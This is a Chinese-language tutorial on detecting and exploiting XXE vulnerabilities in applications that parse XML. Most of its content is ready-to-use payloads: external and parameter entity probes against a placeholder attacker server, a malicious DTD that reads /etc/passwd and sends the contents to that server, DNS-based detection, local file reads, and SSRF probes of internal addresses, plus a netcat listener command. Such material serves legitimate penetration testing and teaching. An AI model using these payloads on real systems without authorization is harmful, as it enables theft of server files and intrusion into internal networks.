### 第1步：寻找并检测XML处理
首先，需要确认应用是否处理XML。
**1. 寻找XML输入点：**
- **明显的数据格式：** 查找任何接受`application/xml`、`text/xml`或`SOAP`（一种基于XML的协议）的请求。
- **文件上传：** 应用可能会处理XML格式的文件，如`.docx`、`.xlsx`、`.pptx`、`SVG`图像等，这些文件本质上是ZIP压缩的XML文件。
- **非XML内容类型：** 尝试将`Content-Type`改为`application/xml`，但发送JSON或其他格式的数据。有时服务器仍然会解析它。
- **修改请求：** 在普通的POST请求（如表单提交）中，尝试将数据格式改为XML。
**2. 检测XML解析：****
**发送一个简单的XML：** 先发送一个无害的XML文档，看服务器是否正常响应，或者错误信息是否表明XML被解析了。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<test>value</test>
```
**触发一个解析错误：** 发送一个格式错误的XML（例如，不闭合的标签），观察错误回显。如果返回了XML解析错误，则证明此处存在XML解析器。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<test><value>
```

---
### 第2步：基本XXE探测 - 带外数据外带
这是最有效、最直接的确认方法。通过让服务器建立一条到外部的网络连接，来证明漏洞确实存在。
**1. 利用外部实体（EE）：**
- 尝试引用一个外部DTD，并让服务器去访问你的服务器。
**经典Payload：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://your-attacker-server.com/xxe">
]>
<foo>&xxe;</foo>
```
- 在你的服务器上（如使用`nc -lvnp 80`），查看是否收到了来自目标服务器的HTTP请求。如果收到了，证明XXE漏洞存在。
**2. 使用参数实体（PE）：**
- 在某些情况下（如实体嵌入在外部DTD中），需要使用参数实体。参数实体以`%`开头。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://your-attacker-server.com/xxe">
  %xxe;
]>
<foo>test</foo>
```
- 注意：`%xxe;`直接在DTD内部被调用，无需在元素中引用。
---
### 第3步：盲测XXE

如果服务器没有直接输出结果，或者你的带外请求没有收到回连，这并不代表XXE不存在。可能是一个**盲XXE**。
**1. 带外数据外带（OOB Exfiltration）：**
- 这是探测和利用盲XXE最主要的技术。核心思想是让服务器分两次加载：先加载一个你控制的外部DTD文件，然后这个DTD文件会指示服务器执行第二个操作（如将敏感文件内容发送到你的服务器）。
**步骤：**  
a. 在你的服务器上放置一个恶意的DTD文件（如 `evil.dtd`）：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://your-attacker-server.com/?exfil=%file;'>">
%exfil;
```
**注意：** 上面的Payload需要URL编码，并且由于文件内容可能包含特殊字符，在实际利用中需要更复杂的处理（如使用FTP协议、将数据放到URL路径中等）
b. 向目标应用程序发送以下XML，引用你的恶意DTD：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://your-attacker-server.com/evil.dtd">
  %xxe;
]>
<foo>&send;</foo>
```
c. 查看你的服务器访问日志，如果收到了包含`/etc/passwd`文件片段的请求，则漏洞利用成功。

**2. 利用DNS查询：**
- 有时防火墙会允许DNS流量。可以尝试通过DNS解析记录来证明漏洞。
```xml
<!ENTITY xxe SYSTEM "http://subdomain.your-attacker-server.com">
```
- 查看你的DNS服务器日志，是否收到了对`subdomain.your-attacker-server.com`的查询。

### 第4步：进阶探测与利用
在确认漏洞存在后，可以进一步尝试利用。
**1. 读取文件：**
- 这是最常见的利用方式。
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```
- 在Windows上，可以尝试：`file:///C:/Windows/System32/drivers/etc/hosts`。
**2. SSRF攻击：**
- XXE可以用于发起SSRF攻击，探测内网服务。
```xml
<!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">
```
